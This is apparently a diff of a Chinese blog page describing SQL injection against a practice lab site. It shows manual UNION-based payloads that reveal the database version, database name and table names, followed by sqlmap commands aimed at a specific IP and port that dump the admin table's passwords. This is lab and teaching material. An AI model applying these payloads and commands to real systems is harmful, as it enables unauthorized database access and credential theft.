@@ -16,10 +16,24 @@
 <meta property="og:site_name" content="Flower and moon">
 <meta property="og:description" content="前言 一般验证sql注入都有两种方式，一种用手工注入，还有就是用sqlmap直接进行暴力破解。一般来讲，我们都会先用手工注入判断这个网站是否存在注入点，之后再用sqlmap对这个网站进行爆破。下面是对一个靶场网站的测试,我将会用两种方式对它进行测试。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-07-27T09:07:47.003Z">
+<meta property="og:image" content="http://pcavp0bkh.bkt.clouddn.com/6.png">
+<meta property="og:image" content="http://pcavp0bkh.bkt.clouddn.com/7.png">
+<meta property="og:image" content="http://pcavp0bkh.bkt.clouddn.com/7.png">
+<meta property="og:image" content="http://pcavp0bkh.bkt.clouddn.com/8.png">
+<meta property="og:image" content="http://pcavp0bkh.bkt.clouddn.com/9.png">
+<meta property="og:image" content="http://pcavp0bkh.bkt.clouddn.com/10.png">
+<meta property="og:image" content="http://pcavp0bkh.bkt.clouddn.com/11.png">
+<meta property="og:image" content="http://pcavp0bkh.bkt.clouddn.com/12.png">
+<meta property="og:image" content="http://pcavp0bkh.bkt.clouddn.com/13.png">
+<meta property="og:image" content="http://pcavp0bkh.bkt.clouddn.com/15.png">
+<meta property="og:image" content="http://pcavp0bkh.bkt.clouddn.com/16.png">
+<meta property="og:image" content="http://pcavp0bkh.bkt.clouddn.com/17.png">
+<meta property="og:image" content="http://pcavp0bkh.bkt.clouddn.com/18.png">
+<meta property="og:updated_time" content="2018-07-27T09:15:17.413Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sql注入的一个实例">
 <meta name="twitter:description" content="前言 一般验证sql注入都有两种方式，一种用手工注入，还有就是用sqlmap直接进行暴力破解。一般来讲，我们都会先用手工注入判断这个网站是否存在注入点，之后再用sqlmap对这个网站进行爆破。下面是对一个靶场网站的测试,我将会用两种方式对它进行测试。">
+<meta name="twitter:image" content="http://pcavp0bkh.bkt.clouddn.com/6.png">
   
   
     <link rel="icon" href="/favicon.png">
@@ -179,32 +193,32 @@
 <a id="more"></a>
 <h3 id="一个sql手工注入的实例"><a href="#一个sql手工注入的实例" class="headerlink" title="一个sql手工注入的实例"></a><strong>一个sql手工注入的实例</strong></h3><blockquote>
 <ul>
-<li>先判断这个网站是否存在注入用 and 1=1 和and1=2 分别测试<br>初始：<br>and 1=1：<a href="http://pcavp0bkh.bkt.clouddn.com/6.png" target="_blank" rel="noopener">http://pcavp0bkh.bkt.clouddn.com/6.png</a><br>and 1=2：<a href="http://pcavp0bkh.bkt.clouddn.com/7.png" target="_blank" rel="noopener">http://pcavp0bkh.bkt.clouddn.com/7.png</a><br>由此初步判断有注入点。</li>
+<li>先判断这个网站是否存在注入用 and 1=1 和and1=2 分别测试<br>初始：<br>and 1=1：<img src="http://pcavp0bkh.bkt.clouddn.com/6.png" alt=""><br>and 1=2：<img src="http://pcavp0bkh.bkt.clouddn.com/7.png" alt=""><br>由此初步判断有注入点。</li>
 </ul>
 </blockquote>
 <blockquote>
 <ul>
-<li>然后再输入;and 1=2,返回的是<br><a href="http://pcavp0bkh.bkt.clouddn.com/7.png" target="_blank" rel="noopener">http://pcavp0bkh.bkt.clouddn.com/7.png</a><br>到了这里基本就可以判断是存在注入了。</li>
+<li>然后再输入;and 1=2,返回的是<br><img src="http://pcavp0bkh.bkt.clouddn.com/7.png" alt=""><br>到了这里基本就可以判断是存在注入了。</li>
 </ul>
 </blockquote>
 <blockquote>
 <ul>
-<li>我们首先使用order by 猜注入点 ，先是order by 10<br><a href="http://pcavp0bkh.bkt.clouddn.com/8.png" target="_blank" rel="noopener">http://pcavp0bkh.bkt.clouddn.com/8.png</a><br>发现报错，然后使用二分法，一直到order by 2时，返回的页面为这个：<br><a href="http://pcavp0bkh.bkt.clouddn.com/9.png" target="_blank" rel="noopener">http://pcavp0bkh.bkt.clouddn.com/9.png</a><br>那么基本确定注入点为2.</li>
+<li>我们首先使用order by 猜注入点 ，先是order by 10<br><img src="http://pcavp0bkh.bkt.clouddn.com/8.png" alt=""><br>发现报错，然后使用二分法，一直到order by 2时，返回的页面为这个：<br><img src="http://pcavp0bkh.bkt.clouddn.com/9.png" alt=""><br>那么基本确定注入点为2.</li>
 </ul>
 </blockquote>
 <blockquote>
 <ul>
-<li>查出有多少个字段<br><a href="http://pcavp0bkh.bkt.clouddn.com/10.png" target="_blank" rel="noopener">http://pcavp0bkh.bkt.clouddn.com/10.png</a></li>
+<li>查出有多少个字段<br><img src="http://pcavp0bkh.bkt.clouddn.com/10.png" alt=""></li>
 </ul>
 </blockquote>
 <blockquote>
 <ul>
-<li>接下来查一下数据库版本，and 1=2 UNION SELECT 1,version()<br><a href="http://pcavp0bkh.bkt.clouddn.com/11.png" target="_blank" rel="noopener">http://pcavp0bkh.bkt.clouddn.com/11.png</a><br>确定数据库版本为mysql 5.5.53</li>
+<li>接下来查一下数据库版本，and 1=2 UNION SELECT 1,version()<br><img src="http://pcavp0bkh.bkt.clouddn.com/11.png" alt=""><br>确定数据库版本为mysql 5.5.53</li>
 </ul>
 </blockquote>
 <blockquote>
 <ul>
-<li>and 1=2 UNION SELECT 1,database()爆出数据库名<br><a href="http://pcavp0bkh.bkt.clouddn.com/12.png" target="_blank" rel="noopener">http://pcavp0bkh.bkt.clouddn.com/12.png</a><br>因为这是个mysql数据库，且版本为5.5.53，所以接下来查询表名：<br>and 1=2 UNION SELECT 1,table_name from information_schema.tables where table_schema=database()<br><a href="http://pcavp0bkh.bkt.clouddn.com/13.png" target="_blank" rel="noopener">http://pcavp0bkh.bkt.clouddn.com/13.png</a></li>
+<li>and 1=2 UNION SELECT 1,database()爆出数据库名<br><img src="http://pcavp0bkh.bkt.clouddn.com/12.png" alt=""><br>因为这是个mysql数据库，且版本为5.5.53，所以接下来查询表名：<br>and 1=2 UNION SELECT 1,table_name from information_schema.tables where table_schema=database()<br><img src="http://pcavp0bkh.bkt.clouddn.com/13.png" alt=""></li>
 </ul>
 </blockquote>
 <blockquote>
@@ -219,28 +233,28 @@
 </ul>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot; http://120.203.13.75:6815/?id=1&quot;  --dbs</span><br></pre></td></tr></table></figure>
-<p><a href="http://pcavp0bkh.bkt.clouddn.com/15.png" target="_blank" rel="noopener">http://pcavp0bkh.bkt.clouddn.com/15.png</a><br>从这里直接得出有2个数据库<br>information_schema和maoshe版本是MySQL &gt;= 5.0.12</p>
+<p><img src="http://pcavp0bkh.bkt.clouddn.com/15.png" alt=""><br>从这里直接得出有2个数据库<br>information_schema和maoshe版本是MySQL &gt;= 5.0.12</p>
 <blockquote>
 <ul>
 <li>接着我们再爆出maoshe数据库的表</li>
 </ul>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://120.203.13.75:6815/?id=1&quot; -D maoshe --tables</span><br></pre></td></tr></table></figure>
-<p><a href="http://pcavp0bkh.bkt.clouddn.com/16.png" target="_blank" rel="noopener">http://pcavp0bkh.bkt.clouddn.com/16.png</a></p>
+<p><img src="http://pcavp0bkh.bkt.clouddn.com/16.png" alt=""></p>
 <blockquote>
 <ul>
 <li>看到了maoshe数据库里面有5张表，其中admin表一般就是我们要找到表。再继续从表中得到字段。</li>
 </ul>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://120.203.13.75:6815/?id=1&quot; -D maoshe -T admin --columns</span><br></pre></td></tr></table></figure>
-<p><a href="http://pcavp0bkh.bkt.clouddn.com/17.png" target="_blank" rel="noopener">http://pcavp0bkh.bkt.clouddn.com/17.png</a></p>
+<p><img src="http://pcavp0bkh.bkt.clouddn.com/17.png" alt=""></p>
 <blockquote>
 <ul>
 <li>得到了 id password username 3个字段，接下来我们只需要得到 password和username就行了。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://120.203.13.75:6815/?id=1&quot; -D maoshe -T admin -C password --dump</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 </blockquote>
-<p><a href="http://pcavp0bkh.bkt.clouddn.com/18.png" target="_blank" rel="noopener">http://pcavp0bkh.bkt.clouddn.com/18.png</a></p>
+<p><img src="http://pcavp0bkh.bkt.clouddn.com/18.png" alt=""></p>
 <blockquote>
 <ul>
 <li>到这里我们就得到了 password，之后也可以得到username</li>
